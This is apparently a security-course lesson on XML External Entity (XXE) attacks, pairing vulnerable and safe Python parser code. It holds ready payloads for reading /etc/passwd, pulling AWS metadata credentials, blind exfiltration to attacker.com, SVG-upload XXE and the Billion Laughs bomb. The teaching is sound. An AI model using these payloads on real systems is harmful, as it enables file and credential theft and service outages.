Module 15 — XML External Entity (XXE)

Discover how XML parsers can be abused to read files, perform SSRF, and exfiltrate data through entity expansion.

An Ancient Feature, a Modern Vulnerability

XML was designed in the late 1990s, and its creators built in a powerful feature called external entities — a way for an XML document to include content from external files or URLs. At the time, this seemed like a great idea. You could define a reusable text block and reference it throughout the document, or pull in data from another file.

The problem is that "include content from a file" means any file on the server. And "include content from a URL" means the server will make HTTP requests to any URL you specify. When an application parses user-supplied XML with external entities enabled, the attacker can read arbitrary files from the server, make the server connect to internal services (SSRF), and exfiltrate data to their own server.

XXE is one of those vulnerabilities that surprises people because the dangerous behavior is not a bug — it is a feature of the XML specification. The XML parser is doing exactly what it is designed to do. The vulnerability is that nobody should be using this feature with untrusted input.

XML Entities and DTDs — The Basics

Before we exploit XXE, you need to understand how XML entities work. A Document Type Definition (DTD) can define entities — named references that expand to values when the XML is parsed. Think of them like variables in a programming language.

TypeSyntaxWhat It Does
Internal entity<!ENTITY name "value">Expands to a predefined string
External entity (file)<!ENTITY name SYSTEM "file:///etc/passwd">Reads the contents of a local file
External entity (URL)<!ENTITY name SYSTEM "http://internal:8080/">Makes an HTTP request and includes the response
Parameter entity<!ENTITY % name SYSTEM "url">Used within the DTD itself (for blind/OOB XXE)

Basic XXE — Reading Files

The simplest XXE attack defines an external entity that reads a local file, then references that entity in the XML body so the file contents appear in the server's response: 

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

When the server parses this XML, it encounters &xxe; and replaces it with the contents of /etc/passwd. If the application displays or returns the parsed XML content, the attacker sees the file right in the response.

Vulnerable Code

from lxml import etree

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # DANGEROUS: resolves external entities by default
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    doc = etree.fromstring(xml_data, parser)
    return etree.tostring(doc, pretty_print=True)

Safe Code

import defusedxml.ElementTree as ET

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # SAFE: defusedxml blocks DTDs, external entities, and entity expansion
    doc = ET.fromstring(xml_data)
    return ET.tostring(doc)
defusedxml: The Python defusedxml library is a drop-in replacement for the standard XML libraries that disables all dangerous XML features by default. If you are parsing XML in Python, always use defusedxml. It blocks external entities, DTD processing, and entity expansion bombs.

XXE for SSRF

External entities do not just read files — they can also make HTTP requests. This turns XXE into a Server-Side Request Forgery (SSRF) vector: 

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

This payload makes the server fetch the AWS metadata endpoint — which is only accessible from within the AWS network. If the application is running on EC2, the attacker gets the instance's IAM credentials. This is the same SSRF attack vector that was used in the Capital One breach in 2019 (though that specific breach used a different SSRF vector, not XXE).

Blind XXE — When You Cannot See the Output

What if the application parses your XML but does not return the entity values in the response? You need to exfiltrate the data out-of-band. This uses parameter entities — entities that are used within the DTD itself and can trigger HTTP requests carrying the stolen data: 

<!-- Step 1: Host this DTD file on your server (evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
<!-- Step 2: Send this XML to the target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>test</data>

The server fetches your external DTD, which reads a local file and then makes an HTTP request to your server with the file contents in the URL. You see the data in your server logs. Complicated? Yes. But it works reliably against many XML parsers.

XXE via File Uploads

XXE does not just happen in obvious XML API endpoints. Many file formats are secretly XML under the hood:

  • SVG images — XML-based vector graphics. Upload an SVG with XXE payloads.
  • DOCX/XLSX/PPTX — Microsoft Office files are ZIP archives containing XML files. Modify the internal XML to include entities.
  • SOAP requests — SOAP APIs use XML for all communication.
  • RSS/Atom feeds — XML-based syndication formats.
  • SAML assertions — XML-based authentication tokens used in SSO.
<!-- XXE via SVG upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
Pro Tip: When testing file upload features, always try uploading an SVG with XXE payloads. Many image processing libraries parse SVG as XML and are vulnerable. Even if the application only accepts PNG/JPG, try changing the Content-Type to image/svg+xml and see if the server processes it.

The Billion Laughs Attack (XML Bomb)

A related XML attack is the "Billion Laughs" denial-of-service attack, which uses nested entity expansion to consume massive amounts of memory: 

<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... repeat 7 more times ... -->
]>
<data>&lol9;</data>

Each level multiplies by 10, so &lol9; expands to 10^9 (one billion) copies of "lol" — consuming gigabytes of memory and crashing the parser. This is why defusedxml also limits entity expansion depth.

Impact: XXE can read local files (source code, configuration, credentials), perform SSRF to internal services (cloud metadata, databases, admin panels), exfiltrate data out-of-band, cause denial of service via entity expansion, and in rare cases achieve RCE (via PHP's expect:// wrapper or .NET's process execution).
